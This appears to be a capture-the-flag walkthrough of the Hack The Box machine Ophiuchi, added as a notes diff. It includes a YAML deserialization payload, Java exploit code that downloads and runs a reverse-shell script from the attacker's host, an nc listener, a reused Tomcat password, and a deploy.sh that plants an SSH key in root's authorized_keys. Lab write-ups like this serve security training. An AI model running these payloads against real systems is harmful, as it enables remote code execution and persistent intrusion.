@@ -1,0 +1,94 @@
+HTB - Ophiuchi
+
+=== RECON ===
+Nmap
+$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.227
+$ nmap -p 22,8080 -sCV -oA scans/nmap-tcpscripts 10.10.10.227
+- Based on OpenSSH version, host is likely running Ubuntu 20.04 Focal
+- Tomcat server -> expect Java-based site
+
+Website - TCP 8080
+- Site is a YAML parser -> feature is temporarily on hold
+$ gobuster dir -u http://10.10.10.227:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster-root-small -t 40
+    - /manager is Tomcat manager page -> needs creds
+    - /test redirects to /test/ -> 404 error
+
+=== SHELL AS TOMCAT ===
+Deserialization POC
+- Java-based payloads for YAML parser -> google "Java YAML deserialization"
+!!javax.script.ScriptEngineManager [
+    !!java.net.URLClassLoader [[
+        !!java.net.URL ["http://10.10.14.7/"]
+    ]]
+]
+$ sudo python3 -m http.server 80 -> upon submitting to YAML parser there's a request -> POC works
+
+RCE POC
+$ cp -r src/ ~/hackthebox/ophiuchi-10.10.10.227/
+$ javac src/artsploit/AwesomeScriptEngineFactory.java
+$ jar -cvf ping.jar -C src/ .
+$ jar -tf ping.jar
+$ cat src/META-INF/services/javax.script.ScriptEngineFactory
+$ sudo tcpdump -i tun0 -n icmp -> server pings VM
+
+Rev Shell
+- Putting bash and nc based shells into Runtime.getRuntime().exec() doesn't work
+- putting curl http://10.10.14.7 works
+    1 Use curl or wget to upload bash script that provides reverse shell
+    2 chmod +x the script
+    3 Call the script
+public AwesomeScriptEngineFactory() throws InterruptedException {
+    try {
+        Process p = Runtime.getRuntime().exec("curl http://10.10.14.7/shell.sh -o /dev/shm/.s.sh");
+        p.waitFor();
+        p = Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh");
+        p.waitFor();
+        p = Runtime.getRuntime().exec("/dev/shm/.s.sh");
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
+}
+$ javac src/artsploit/AwesomeScriptEngineFactory.java
+$ jar -cvf rev.jar -C src/ .
+$ mv rev.jar www/
+$ sudo nc-lnvp 443 -> reverse shell
+> python3 -c 'import pty;pty.spawn("bash")' -> ^Z -> stty raw -echo; fg -> upgraded shell
+
+=== SHELL AS ADMIN ===
+> ls -la -> user.txt but no read privs
+> pwd -> tomcat home directory is /opt/tomcat
+- /opt/tomcat/conf/tomcat-users.xml has user and pw for Tomcat -> admin:whythereisalimit
+> su admin - -> password is reused
+$ sshpass -p "whythereisalimit" ssh admin@10.10.10.227
+> cat user.txt -> USER FLAG
+
+=== SHELL AS ROOT ===
+Enumeration
+> sudo -l -> can run specific Go program index.go
+> cat index.go -> reads main.wasm and creates new wasm instance -> runs info and checks result -> if 1 -> runs deploy.sh
+> sudo /usr/bin/go run /opt/wasm-functions/index.go -> errors
+    - Need to run in directory where main.wasm is
+
+Reverse main.wasm
+- main.wasm is currently returning non-1 value
+- wasm is web assembly
+$ sshpass -p whythereisalimit scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
+$ file main.wasm
+- Google WASM disassembler -> WebAssembly Binary Toolkit or WABT
+$ git clone --recursive https://github.com/WebAssembly/wabt -> cd wabt/ -> make
+$ /opt/wabt/bin/wasm2wat main.wasm -> converts main.wasm to text (from binary)
+$ /opt/wabt/bin/wasm-decompile main.wasm -> much cleaner
+
+Exploit
+- Strategy is to write a main.wasm that returns 1 and a deploy.sh that gives a shell
+- Use WasmFiddle to convert simple c code into wasm
+$ sshpass -p whythereisalimit scp program.wasm admin@10.10.10.227:/dev/shm
+- Create deploy.sh that creates .ssh directory for root and write public SSH key into authorized keys
+#!/bin/bash
+echo "[*] Adding public key to /root/.ssh/authorized_keys"
+mkdir -p /root/.ssh
+echo "ssh-ed25519 AAAAC3N...G3d nobody@nothing" >> /root/.ssh/authorized_keys
+echo "[+] Done"
+> sudo /usr/bin/go run /opt/wasm-functions/index.go
+$ ssh -i ~/keys/ed25519_gen root@10.10.10.227
+> cat root.txt -> ROOT FLAG
